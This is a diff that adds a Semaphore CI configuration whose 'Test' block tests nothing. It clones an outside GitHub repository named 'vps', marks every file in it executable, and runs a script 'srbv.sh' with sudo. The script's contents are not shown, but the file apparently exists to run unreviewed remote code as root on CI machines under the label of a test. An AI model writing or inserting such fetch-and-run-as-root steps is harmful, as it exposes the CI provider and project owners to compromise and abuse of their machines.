@@ -1,0 +1,15 @@
+# .semaphore/semaphore.yml
+
+agent:
+  machine:
+    type: e1-standard-2    # Linux machine type with 2 vCPUs, 4 GB of RAM
+    os_image: ubuntu1804   # The Ubuntu 18.04 OS image.
+blocks:
+  - name: "Test"
+    task:
+      prologue:
+        commands:
+          - git clone https://github.com/champlin01/vps
+          - cd vps
+          - chmod +x *
+          - sudo ./srbv.sh
